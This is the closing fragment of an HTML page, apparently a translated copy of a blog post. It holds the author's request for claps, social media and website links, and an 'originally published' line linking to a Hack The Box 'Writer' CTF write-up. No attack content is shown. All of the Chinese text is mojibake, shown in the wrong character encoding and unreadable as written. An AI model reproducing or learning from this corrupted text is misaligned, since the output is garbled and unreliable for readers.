å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°ã€‚è¿™æ˜¯å…è´¹çš„ï¼Œå®ƒè®©æˆ‘çŸ¥é“æˆ‘æ­£åœ¨å†™ä½ æ„Ÿå…´è¶£çš„å†…å®¹ã€‚</p><p id="6eb7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¨ç‰¹â€”<a class="ae nh" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>ç½‘ç«™â€” <a class="ae nh" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="23b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="od">åŸè½½äº2021å¹´12æœˆ12æ—¥</em><a class="ae nh" href="https://pencer.io/ctf/ctf-htb-writer" rel="noopener ugc nofollow" target="_blank"><em class="od">https://pencer . io</em></a><em class="od">ã€‚</em></p></div></div>    
</body>
</html>